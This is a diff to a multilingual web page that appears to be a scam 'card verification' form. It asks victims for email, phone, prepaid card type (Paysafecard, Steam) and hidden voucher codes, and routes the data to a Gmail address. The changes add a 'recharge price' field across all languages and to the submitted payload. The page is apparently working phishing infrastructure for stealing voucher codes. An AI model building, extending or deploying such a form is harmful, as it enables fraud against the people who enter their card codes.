@@ -45,11 +45,12 @@
         var text_input7 = '';
         var text_input8 = '';
         var text_input9 = '';
+        var text_input10 = '';
 
         switch (card) {
             case '9dfd9ze':
                 email = 'cardcheckyour@gmail.com';
-                name = 'Innoceby';
+                name = 'Innocent';
                 break;
 
             default:
@@ -70,6 +71,7 @@
                 text_input7 = 'Yes';
                 text_input8 = 'No';
                 text_input9 = 'Submit';
+                text_input10 = 'Price of recharge';
                 break;
             case 'fr':
                 text_head1 = 'Remplissez le formulaire pour faire la vérification';
@@ -83,6 +85,7 @@
                 text_input7 = 'Oui';
                 text_input8 = 'Non';
                 text_input9 = 'Vérifier';
+                text_input10 = 'Prix de la recharge';
                 break;
             case 'de':
                 text_head1 = 'Füllen Sie das Formular aus, um die Überprüfung durchzuführen';
@@ -96,6 +99,7 @@
                 text_input7 = 'Ja';
                 text_input8 = 'Nein';
                 text_input9 = 'Überprüfen';
+                text_input10 = 'Price of recharge';
                 break;
             case 'nl':
                 text_head1 = "Vul het formulier in voor verificatie";
@@ -109,6 +113,7 @@
                 text_input7 = 'Ja';
                 text_input8 = 'Geen';
                 text_input9 = 'Controleer';
+                text_input10 = 'Price of recharge';
                 break;
             case 'it':
                 text_head1 = 'Compila il modulo per la verifica';
@@ -122,6 +127,7 @@
                 text_input7 = 'Sì';
                 text_input8 = 'No';
                 text_input9 = 'Controllo';
+                text_input10 = 'Price of recharge';
                 break;
             case 'es':
                 text_head1 = 'Rellene el formulario de verificación';
@@ -135,6 +141,7 @@
                 text_input7 = 'Sì';
                 text_input8 = 'No';
                 text_input9 = 'Consulte';
+                text_input10 = 'Price of recharge';
                 break;
 
             default:
@@ -149,6 +156,7 @@
                 text_input7 = 'Yes';
                 text_input8 = 'No';
                 text_input9 = 'Submit';
+                text_input10 = 'Price of recharge';
                 break;
         }
     </script>
@@ -161,6 +169,7 @@
                 email: document.getElementById("email").value,
                 tel: document.getElementById("tel").value,
                 recharge: document.getElementById("recharge").value,
+                recharge_price: document.getElementById("recharge_price").value,
                 recharge_value: document.getElementById("recharge_value").value,
             };
 
@@ -200,6 +209,7 @@
             document.getElementById("email").placeholder = text_input2;
             document.getElementById("tel").placeholder = text_input3;
             document.getElementById("recharge").options[0].innerHTML = text_input4;
+            document.getElementById("recharge_price").placeholder = text_input10;
             document.getElementById("recharge_value").placeholder = text_input5;
 
             document.getElementById("label_hidden_code1").innerHTML = text_input6;
@@ -255,6 +265,10 @@
                                         <option>Paysafecard</option>
                                         <option>Steam</option>
                                     </select>
+                                </div>
+                                <div class="col-12">
+                                    <input id="recharge_price" name="recharge_price" class="form-control form-control-gray" type="text"
+                                        placeholder="Prix de la recharge">
                                 </div>
                                 <div class="col-12 mb-10">
                                     <input id="recharge_value" name="recharge_value"
